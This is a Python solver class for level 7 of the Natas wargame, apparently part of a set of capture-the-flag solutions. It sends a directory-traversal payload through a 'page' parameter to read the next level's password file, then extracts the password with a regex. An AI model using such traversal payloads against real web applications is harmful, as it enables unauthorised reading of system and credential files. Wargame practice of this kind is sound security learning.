import re
from .base_solver import NatasSolver

class Natas7Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Exploit local file inclusion with directory traversal
            response = self.make_request(
                "index.php",
                params={"page": "../../../../etc/natas_webpass/natas8"}
            )
            
            # Extract password using the specific pattern
            match = re.findall(r"<br>\n(.*)\n\n<!-- hint: password for webuser natas8", response.text)
            if not match:
                raise ValueError("Could not find password in response")
                
            return match[0].strip()

        except Exception as e:
            raise RuntimeError(f"Failed to solve natas7: {str(e)}")